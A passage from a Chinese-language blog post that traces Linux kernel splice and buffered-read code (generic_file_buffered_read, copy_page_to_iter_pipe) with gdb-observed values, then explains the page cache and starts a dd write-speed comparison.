class="built_in">i_size_read</span>(inode);</span><br><span class="line"><span class="keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">filemap_range_has_page</span>(mapping, iocb-&gt;ki_pos,</span><br><span class="line">   iocb-&gt;ki_pos + count - <span class="number">1</span>))</span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">retval = <span class="built_in">filemap_write_and_wait_range</span>(mapping,</span><br><span class="line">iocb-&gt;ki_pos,</span><br><span class="line">        iocb-&gt;ki_pos + count - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">file_accessed</span>(file);</span><br><span class="line"></span><br><span class="line">retval = mapping-&gt;a_ops-&gt;<span class="built_in">direct_IO</span>(iocb, iter);</span><br><span class="line"><span class="keyword">if</span> (retval &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">iocb-&gt;ki_pos += retval;</span><br><span class="line">count -= retval;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">iov_iter_revert</span>(iter, count - <span class="built_in">iov_iter_count</span>(iter));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Btrfs can have a short DIO read if we encounter</span></span><br><span class="line"><span class="comment"> * compressed extents, so if there was an error, or if</span></span><br><span class="line"><span class="comment"> * we&#x27;ve already read everything we wanted to, or if</span></span><br><span class="line"><span class="comment"> * there was a short read because we hit EOF, go ahead</span></span><br><span class="line"><span class="comment"> * and return.  Otherwise fallthrough to buffered io for</span></span><br><span class="line"><span class="comment"> * the rest of the read.  Buffered reads will not work for</span></span><br><span class="line"><span class="comment"> * DAX files, so don&#x27;t bother trying.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">如果我们遇到压缩范围，Btrfs 可以进行短 DIO 读取，因此如果出现错误，或者如果我们已经读取了我们想要的所有内容，或者因为我们遇到 EOF 而导致短读取，请继续并返回。 否则，在其余的读取过程中将使用缓冲 io。 缓冲读取不适用于 DAX 文件，因此不要费心尝试。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span> || !count || iocb-&gt;ki_pos &gt;= size ||</span><br><span class="line">    <span class="built_in">IS_DAX</span>(inode))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retval = <span class="built_in">generic_file_buffered_read</span>(iocb, iter, retval);<span class="comment">// retval == 0x0 ，跟进</span></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10、generic-file-buffered-read"><a href="#10、generic-file-buffered-read" class="headerlink" title="10、generic_file_buffered_read"></a>10、generic_file_buffered_read</h4><p>这里通过<code>kmalloc_array</code>函数为<code>pages</code>生成一块空间，并通过<code>generic_file_buffered_read_get_pages</code>将<code>iocb</code>的部分内容传入pages。之后调用<code>copy_page_to_iter</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下翻译自源码注释</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * generic_file_buffered_read - 通用文件读取例程</span></span><br><span class="line"><span class="comment">  * @iocb: 要读取的 iocb</span></span><br><span class="line"><span class="comment">  * @iter: 数据目的地</span></span><br><span class="line"><span class="comment">  * @written: 已复制</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这是一个通用的文件读取例程，并使用 mapping-&gt;a_ops-&gt;readpage() 函数来处理实际的低级内容。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 这真的很难看。 但是当涉及到错误处理等时，goto 实际上试图澄清一些逻辑。</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * 返回：</span></span><br><span class="line"><span class="comment">  * * 复制的总字节数，包括那些已经被@写入负错误代码的字节，如果没有复制的话</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">generic_file_buffered_read</span><span class="params">(struct kiocb *iocb,</span></span></span><br><span class="line"><span class="params"><span class="function">struct iov_iter *iter, <span class="keyword">ssize_t</span> written)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;<span class="comment">// 指向file的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span> *<span class="title">ra</span> =</span> &amp;filp-&gt;f_ra;<span class="comment">// 用于跟踪单个文件的预读状态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> filp-&gt;f_mapping;<span class="comment">// struct address_space ： Contents of a cacheable, mappable object.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> mapping-&gt;host;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">pages_onstack</span>[<span class="title">PAGEVEC_SIZE</span>], **<span class="title">pages</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_pages = <span class="built_in">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="number">512</span>,</span><br><span class="line">((iocb-&gt;ki_pos + iter-&gt;count + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT) -</span><br><span class="line">(iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT));<span class="comment">// nr_pages == 0x1</span></span><br><span class="line"><span class="keyword">int</span> i, pg_nr, error = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> writably_mapped;</span><br><span class="line"><span class="keyword">loff_t</span> isize, end_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(iocb-&gt;ki_pos &gt;= inode-&gt;i_sb-&gt;s_maxbytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!<span class="built_in">iov_iter_count</span>(iter)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">iov_iter_truncate</span>(iter, inode-&gt;i_sb-&gt;s_maxbytes);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    iov_iter_truncate 函数定义如下</span></span><br><span class="line"><span class="comment">    static inline void iov_iter_truncate(struct iov_iter *i, u64 count)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if (i-&gt;count &gt; count)</span></span><br><span class="line"><span class="comment">i-&gt;count = count;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">这里 iter-&gt;count = 0x1， inode-&gt;i_sb-&gt;s_maxbytes == 0xffffffff000， inode-&gt;i_sb-&gt;s_maxbytes相当于iter-&gt;count的上限。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nr_pages &gt; <span class="built_in">ARRAY_SIZE</span>(pages_onstack))</span><br><span class="line">pages = <span class="built_in">kmalloc_array</span>(nr_pages, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">void</span> *), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pages) &#123;</span><br><span class="line">pages = pages_onstack;<span class="comment">// *pages == 0x1</span></span><br><span class="line">nr_pages = <span class="built_in">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, nr_pages, <span class="built_in">ARRAY_SIZE</span>(pages_onstack));<span class="comment">// nr_pages == 0x1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">cond_resched</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码注释：</span></span><br><span class="line"><span class="comment">如果我们已经成功复制了一些数据，那么我们不能再安全地返回 -EIOCBQUEUED。 因此，此时标记一个异步读取 NOWAIT 。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="comment">// 实际上此时written值为0x0，我们还写入任何数据</span></span><br><span class="line"><span class="keyword">if</span> ((iocb-&gt;ki_flags &amp; IOCB_WAITQ) &amp;&amp; written)</span><br><span class="line">iocb-&gt;ki_flags |= IOCB_NOWAIT;</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">pg_nr = <span class="built_in">generic_file_buffered_read_get_pages</span>(iocb, iter,</span><br><span class="line">     pages, nr_pages);<span class="comment">// pg_nr == 0x1</span></span><br><span class="line"><span class="keyword">if</span> (pg_nr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">error = pg_nr;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码：</span></span><br><span class="line"><span class="comment">* 在我们知道页面是最新的之后，必须检查 i_size。</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* 检查后检查 i_size 允许我们计算“nr”的正确值，这意味着页面的零填充部分不会复制回用户空间（除非另一个截断扩展文件 - 这是需要的）。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">isize = <span class="built_in">i_size_read</span>(inode);<span class="comment">// isize == 0x552</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(iocb-&gt;ki_pos &gt;= isize))<span class="comment">// iocb-&gt;ki_pos == 0x3，这个 iocb-&gt;ki_pos是传入的文件的偏移offset。</span></span><br><span class="line"><span class="keyword">goto</span> put_pages;</span><br><span class="line"></span><br><span class="line">end_offset = <span class="built_in">min_t</span>(<span class="keyword">loff_t</span>, isize, iocb-&gt;ki_pos + iter-&gt;count);<span class="comment">// end_offset == 0x4splice的是从0x3 ~ 0x4的一个字节</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT) + pg_nr &gt;</span><br><span class="line">       (end_offset + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT)</span><br><span class="line"><span class="built_in">put_page</span>(pages[--pg_nr]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        翻译自源码注释：</span></span><br><span class="line"><span class="comment">* 一旦我们开始复制数据，我们不想接触任何可能被争用的缓存行：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">writably_mapped = <span class="built_in">mapping_writably_mapped</span>(mapping);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When a sequential read accesses a page several times, only</span></span><br><span class="line"><span class="comment"> * mark it as accessed the first time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (iocb-&gt;ki_pos &gt;&gt; PAGE_SHIFT !=</span><br><span class="line">    ra-&gt;prev_pos &gt;&gt; PAGE_SHIFT)<span class="comment">// iocb-&gt;ki_pos = 0x3 , ra-&gt;prev_pos ==  0xffffffffffffffff</span></span><br><span class="line"><span class="built_in">mark_page_accessed</span>(pages[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; pg_nr; i++)</span><br><span class="line"><span class="built_in">mark_page_accessed</span>(pages[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pg_nr; i++) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset = iocb-&gt;ki_pos &amp; ~PAGE_MASK;<span class="comment">// offset == 0x3</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bytes = <span class="built_in">min_t</span>(<span class="keyword">loff_t</span>, end_offset - iocb-&gt;ki_pos,</span><br><span class="line">   PAGE_SIZE - offset);<span class="comment">// bytes == 0x1</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            翻译自源码注释：</span></span><br><span class="line"><span class="comment">            * 如果用户可以使用任意虚拟地址写入此页面，请在内核端读取页面之前注意潜在的别名。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"><span class="keyword">if</span> (writably_mapped)</span><br><span class="line"><span class="built_in">flush_dcache_page</span>(pages[i]);</span><br><span class="line"></span><br><span class="line">copied = <span class="built_in">copy_page_to_iter</span>(pages[i], offset, bytes, iter);<span class="comment">// 此时 i== 0，offset == 0x3，bytes == 0x1 跟进</span></span><br><span class="line"></span><br><span class="line">written += copied;</span><br><span class="line">iocb-&gt;ki_pos += copied;</span><br><span class="line">ra-&gt;prev_pos = iocb-&gt;ki_pos;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copied &lt; bytes) &#123;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">put_pages:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pg_nr; i++)</span><br><span class="line"><span class="built_in">put_page</span>(pages[i]);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">iov_iter_count</span>(iter) &amp;&amp; iocb-&gt;ki_pos &lt; isize &amp;&amp; !error);</span><br><span class="line"></span><br><span class="line"><span class="built_in">file_accessed</span>(filp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pages != pages_onstack)</span><br><span class="line"><span class="built_in">kfree</span>(pages);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> written ? written : error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p *iocb</span><br><span class="line">$179 = &#123;</span><br><span class="line">  ki_filp = 0xffff8880042a6700,</span><br><span class="line">  ki_pos = 0x3,</span><br><span class="line">  ki_complete = 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  private = 0x0 &lt;fixed_percpu_data&gt;,</span><br><span class="line">  ki_flags = 0x0,</span><br><span class="line">  ki_hint = 0x0,</span><br><span class="line">  ki_ioprio = 0x0,</span><br><span class="line">  &#123;</span><br><span class="line">    ki_cookie = 0x0,</span><br><span class="line">    ki_waitq = 0x0 &lt;fixed_percpu_data&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">gef➤  p iocb</span><br><span class="line">$180 = (struct kiocb *) 0xffffc900003b7df0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="11、copy-page-to-iter"><a href="#11、copy-page-to-iter" class="headerlink" title="11、copy_page_to_iter"></a>11、copy_page_to_iter</h4><p>没做啥，继续跟进<code>copy_page_to_iter_pipe</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_page_to_iter</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!<span class="built_in">page_copy_sane</span>(page, offset, bytes)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (i-&gt;type &amp; (ITER_BVEC|ITER_KVEC)) &#123;</span><br><span class="line"><span class="keyword">void</span> *kaddr = <span class="built_in">kmap_atomic</span>(page);</span><br><span class="line"><span class="keyword">size_t</span> wanted = <span class="built_in">copy_to_iter</span>(kaddr + offset, bytes, i);</span><br><span class="line"><span class="built_in">kunmap_atomic</span>(kaddr);</span><br><span class="line"><span class="keyword">return</span> wanted;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">iov_iter_is_discard</span>(i)))</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">likely</span>(!<span class="built_in">iov_iter_is_pipe</span>(i)))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">copy_page_to_iter_iovec</span>(page, offset, bytes, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">copy_page_to_iter_pipe</span>(page, offset, bytes, i);<span class="comment">// 跟进</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12、copy-page-to-iter-pipe"><a href="#12、copy-page-to-iter-pipe" class="headerlink" title="12、copy_page_to_iter_pipe"></a>12、copy_page_to_iter_pipe</h4><p>从这里可以看出，上面将文件信息放入<code>page</code>，这里将<code>page</code>赋值给pipe_buffer-&gt;page，并不涉及到数据的复制，完全靠的是指针的传递。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;<span class="comment">// p_tail  = 0x10</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;<span class="comment">// p_mask === 0xf</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;<span class="comment">// i_head == 0x10</span></span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(bytes &gt; i-&gt;count))<span class="comment">// bytes == 0x1  i-&gt;count == 0x1</span></span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">sanity</span>(i))<span class="comment">// 对inode 做一些合规检查，比如pipe不能为空，必须在 last buffer中等等。</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;<span class="comment">// off == 0x0 ，这里的off是管道偏移，我们传入的参数就是0</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe_full</span>(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line"><span class="built_in">get_page</span>(page);</span><br><span class="line">buf-&gt;page = page;<span class="comment">// 可见splice并没有数据的复制，有的只有指针的传递，将文件page的指针赋值给管道的buf-&gt;page。</span></span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="七、page-cache"><a href="#七、page-cache" class="headerlink" title="七、page cache"></a>七、page cache</h3><p>考虑到这样一个场景，在现有的linux环境下，当我们使用write/read进行读写文件时，我们操作的是磁盘文件吗？</p><p>带着这个疑问，我们思考一下，当涉及到文件操作时，操作系统必须解决两个严重的问题：</p><ol><li>当操作系统读做数据的访问操作时，对磁盘的访问速度远小于内存，文件越大，效果越明显。</li><li>当多个进程均访问同一个磁盘文件的内容时，由于进程数据隔离，不可能将文件内容在所有进程都拷贝一份。如果您使用 <a class="link"   href="http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx" >Process Explorer<i class="fas fa-external-link-alt"></i></a>查看 Windows 进程，您会看到每个进程中加载了大约 15MB 的常用 DLL。我的 Windows 机器现在正在运行 100 个进程，因此如果不共享，我将使用高达 ~1.5 GB 的物理 RAM<em>来处理常见的 DLL</em>。</li></ol><p>基于上面的观点，对内存的访问相较于对磁盘的访问来说更高效。</p><p>但是内存是有限的，我们不可能将磁盘上所有的内容都放入内存中，这时就需要对放入内存中的磁盘文件进行筛选。这时Page cache应运而生。</p><p>在计算机，page cache，有时也称为disk cache，它是一种透明缓存，用于存储源自二级存储设备（如硬盘驱动器(HDD) 或固态驱动器(SSD)）的页面。操作系统在主内存(RAM)的其他未使用部分中保留页面缓存，从而更快地访问缓存页面的内容并提高整体性能。页面缓存在内核中通过分页内存管理实现，并且对应用程序几乎是透明的。</p><p>由于硬盘和内存的读写性能差距巨大，Linux默认情况是以异步方式读写文件的。比如调用系统函数open()打开或者创建文件时缺省情况下是带有O_ASYNC flag的。Linux借助于内核的page cache来实现这种异步操作。引用《Understanding the Linux Kernel, 3rd Edition》中关于<code>page cache</code>的定义：</p><blockquote><p>The page cache is the main disk cache used by the Linux kernel. In most cases, the kernel refers to the page cache when reading from or writing to disk. New pages are added to the page cache to satisfy User Mode processes’s read requests. If the page is not already in the cache, a new entry is added to the cache and filled with the data read from the disk. If there is enough free memory, the page is kept in the cache for an indefinite period of time and can then be reused by other processes without accessing the disk.<br>Similarly, before writing a page of data to a block device, the kernel verifies whether the corresponding page is already included in the cache; if not, a new entry is added to the cache and filled with the data to be written on disk. The I/O data transfer does not start immediately: the disk update is delayed for a few seconds, thus giving a chance to the processes to further modify the data to be written (in other words, the kernel implements deferred write operations).</p></blockquote><p>也就是说，我们平常向硬盘写文件时，默认异步情况下，并不是直接把文件内容写入到硬盘中才返回的，而是成功拷贝到内核的page cache后就直接返回，所以大多数情况下，硬盘写操作不会是性能瓶颈。写入到内核page cache的pages成为dirty pages，稍后会由内核线程pdflush真正写入到硬盘上。</p><p>从硬盘读取文件时，同样不是直接把硬盘上文件内容读取到用户态内存，而是先拷贝到内核的page cache，然后再“拷贝”到用户态内存，这样用户就可以访问该文件。因为涉及到硬盘操作，所以第一次读取一个文件时，不会有性能提升；不过，如果一个文件已经存在page cache中，再次读取该文件时就可以直接从page cache中命中读取不涉及硬盘操作，这时性能就会有很大提高。</p><p>下面用<code>dd</code>比较下异步（缺省模式）和同步写硬盘的速度差别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dd if=/dev/urandom of=async.txt bs=64M count=16 iflag=fullblock</span><br><span class="line">16+0 records in</span><br><span class="line">16+0 records out</span><br><span class="line">1073741824 bytes (1.1 GB, 1.0 GiB) copied, 7.618 s, 141 MB/s</span><br><span 